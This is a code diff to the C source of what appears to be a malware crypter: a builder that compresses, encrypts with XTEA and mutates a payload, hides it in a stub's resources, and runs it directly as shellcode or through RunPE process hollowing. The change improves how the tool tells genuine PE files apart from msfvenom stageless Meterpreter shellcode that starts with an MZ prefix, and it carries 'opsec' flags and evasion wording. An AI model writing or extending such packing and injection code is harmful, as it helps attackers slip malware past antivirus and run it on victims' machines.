@@ -391,18 +391,56 @@ int main(int argc, char* argv[]) {
   }
   printf("[+] Target file loaded (%lu bytes)\n", rawTargetSize);
 
-  /* Auto-detect: if first two bytes are not "MZ" treat as raw PIC shellcode.
+  /* Auto-detect: real PE vs raw shellcode (possibly with MZ-prefix evasion).
+   *
+   * Naive "first two bytes == MZ" misclassifies modern msfvenom stageless raw
+   * shellcode: its first two bytes are 0x4D 0x5A because in x64 those decode
+   * as `pop r10; push r10` — a legitimate prologue.  msfvenom goes further
+   * and embeds an entire metsrv.dll PE structure after the executable stub,
+   * so a real "PE\0\0" signature also exists at the offset that DOS header's
+   * e_lfanew points to.  Both checks pass on what is structurally shellcode.
+   *
+   * Discriminating signal: the DOS header "reserved" region at bytes
+   * 0x18-0x3B (lfarlc, ovno, res[4], oemid, oeminfo, res2[10]).  Genuine PE
+   * files produced by MSVC/GCC/MinGW/etc. have these fields zero-initialised
+   * with at most one non-zero byte (lfarlc typically = 0x40, fitting in a
+   * single byte).  MSF-style MZ-prefix shellcode fills this entire range
+   * with x64 instructions (push imm, call, mov rdx,...) so non-zero bytes
+   * dominate.  A threshold of <=4 non-zero bytes cleanly separates the two
+   * classes in practice (and tolerates the occasional non-standard PE).
+   *
    * The entire pipeline (compress → inner-encrypt → mutate → XTEA → .rsrc)
    * is identical for both formats — only the Stub execution path differs. */
-  if (rawTargetSize >= 2 &&
-      !(rawTargetBuffer[0] == 'M' && rawTargetBuffer[1] == 'Z')) {
+  BOOL bIsRealPE = FALSE;
+  if (rawTargetSize >= 0x40 &&
+      rawTargetBuffer[0] == 'M' && rawTargetBuffer[1] == 'Z')
+  {
+      DWORD e_lfanew = *(DWORD*)(rawTargetBuffer + 0x3C);
+      if (e_lfanew != 0 && (e_lfanew + 4) <= rawTargetSize) {
+          DWORD ntSig = *(DWORD*)(rawTargetBuffer + e_lfanew);
+          /* IMAGE_NT_SIGNATURE = 0x00004550 ("PE\0\0") */
+          if (ntSig == 0x00004550) {
+              int nonZeroCount = 0;
+              for (int i = 0x18; i < 0x3C; i++) {
+                  if (rawTargetBuffer[i] != 0) nonZeroCount++;
+              }
+              if (nonZeroCount <= 4) bIsRealPE = TRUE;
+          }
+      }
+  }
+
+  if (!bIsRealPE) {
       cfg.opsecFlags |= PAYLOAD_FLAG_IS_SHELLCODE;
-      printf("[*] Payload type: raw shellcode (no MZ header) - stub will execute directly\n");
+      if (rawTargetSize >= 2 && rawTargetBuffer[0] == 'M' && rawTargetBuffer[1] == 'Z') {
+          printf("[*] Payload type: raw shellcode (MZ-prefix evasion: DOS header is x64 code) - stub will execute directly\n");
+      } else {
+          printf("[*] Payload type: raw shellcode (no MZ header) - stub will execute directly\n");
+      }
       /* --export / --arg are meaningless for shellcode; clear silently */
       exportHash       = 0;
       cfg.exportArg[0] = '\0';
   } else {
-      printf("[*] Payload type: PE (MZ detected) - stub will use RunPE\n");
+      printf("[*] Payload type: PE (valid MZ + PE headers + clean DOS reserved area) - stub will use RunPE\n");
   }
 
   /* STEP 4: Compressing Target PE (LZNT1) */
